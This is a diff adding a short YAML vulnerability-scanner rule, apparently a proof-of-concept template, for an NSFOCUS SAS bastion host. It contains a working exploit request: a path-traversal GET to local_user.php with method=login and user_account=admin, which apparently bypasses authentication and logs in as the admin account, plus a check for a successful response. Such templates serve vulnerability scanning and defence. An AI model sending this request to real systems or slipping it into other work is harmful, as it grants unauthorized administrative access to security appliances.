@@ -1,0 +1,8 @@
+name: nsfocus-sas-localuser-login-anyuser
+rules:
+  - method: GET
+    path: "/api/virtual/home/status?cat=../../../../../../../../../../../../../../usr/local/nsfocus/web/apache2/www/local_user.php&method=login&user_account=admin"
+    expression: |
+      response.status == 200 && response.body.bcontains(b'"status":200')
+detail:
+  author: 666
